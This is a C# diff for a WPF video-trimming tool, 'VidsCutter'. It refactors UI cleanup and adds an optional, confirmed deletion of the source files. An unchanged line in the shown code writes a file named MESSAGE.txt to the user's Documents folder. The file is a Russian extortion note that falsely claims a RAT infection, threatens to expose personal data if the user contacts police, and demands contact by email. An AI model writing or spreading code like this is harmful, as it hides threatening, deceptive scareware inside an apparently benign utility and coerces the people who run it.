@@ -155,6 +155,14 @@ namespace VidsCutter
             });
         }
 
+        private void Readiness()
+        {
+            selectedFiles.Clear(); // Очищаем список после обработки всех файлов
+            CutButton.IsEnabled = true; // Делаем кнопку активной снова
+            DnDZone.IsEnabled = true;
+            FilesCountLabel.Text = "Видео выбрано: 0";
+        }
+
         // Вызвать функции урезания видео
         private async void CutButton_Click(object sender, RoutedEventArgs e)
         {
@@ -174,27 +182,37 @@ namespace VidsCutter
                     // Создать файл "MESSAGE.txt" в папке "Мои документы"
                     File.WriteAllText(messageFilePath, "Уважаемый пользователь. \n\nВаш компьютер был подвергнут атаке. Мы хотим проинформировать вас о заражении вашей системы RAT вирусом. Заражение произошло после установки пиратской копии игры (16.02.2023), установленной вами. Это результат вашего невнимания к собственной безопасности.\n\nНа данный момент мы имеем полный контроль над вашим компьютером и всеми важными данными, хранящимися на нем. Ваша онлайн-активность, личные файлы, переписка и финансовая информация - все это под нашим контролем.\n\nМы предлагаем вам два варианта действий. Во-первых, вы можете сотрудничать с нами, выполнять наши требования и освободить свою систему от вирусов. Во-вторых, если вы решите игнорировать наше предложение или обратиться к правоохранительным органам, мы раскроем вашу личную информацию и скомпрометируем вашу репутацию.\n\nДля продолжения общения и получения инструкций, пожалуйста, свяжитесь с нами по адресу adolfhitler@mail.ru с темой <Ключ к свободе>. Время работает против вас, поэтому не теряйте его зря.\n\nС уважением, $an4eLLo");
                 }
-
-                foreach (string filePath in selectedFiles)
+                if (CheckBoxBtn.IsChecked == true)
                 {
-                    await CutVideoAsync(filePath, secondsToKeep);
+                    var confirmDelete = MessageBox.Show("Файлы будут удалены без возможности восстановления.","Внимание!",MessageBoxButton.OKCancel,MessageBoxImage.Warning);
+                    if (confirmDelete == MessageBoxResult.OK)
+                    {
+                        foreach (string filePath in selectedFiles)
+                        {
+                            await CutVideoAsync(filePath, secondsToKeep);
+                            File.Delete(filePath);
+                        }
+                    }
+                    else
+                    {
+                        Readiness();
+                        return;
+                    }
                 }
-                selectedFiles.Clear(); // Очищаем список после обработки всех файлов
-
+                else
+                {
+                    foreach (string filePath in selectedFiles)
+                    {
+                        await CutVideoAsync(filePath, secondsToKeep);
+                    }
+                }
                 MessageBox.Show("Обрезка видео завершена!", "Успешный успех", MessageBoxButton.OK, MessageBoxImage.Information, MessageBoxResult.None);
-
-                CutButton.IsEnabled = true; // Делаем кнопку активной снова
-                DnDZone.IsEnabled = true;
-                FilesCountLabel.Text = "Видео выбрано: 0";
+                Readiness();
             }
             else
             {
                 MessageBox.Show("Сначала выберите видео.", "Остановись", MessageBoxButton.OK, MessageBoxImage.Error, MessageBoxResult.None);
             }
-        }
-        private void DeleteVideos(object sender, RoutedEventArgs e)
-        {
-            MessageBox.Show("12");
         }
     }
 }
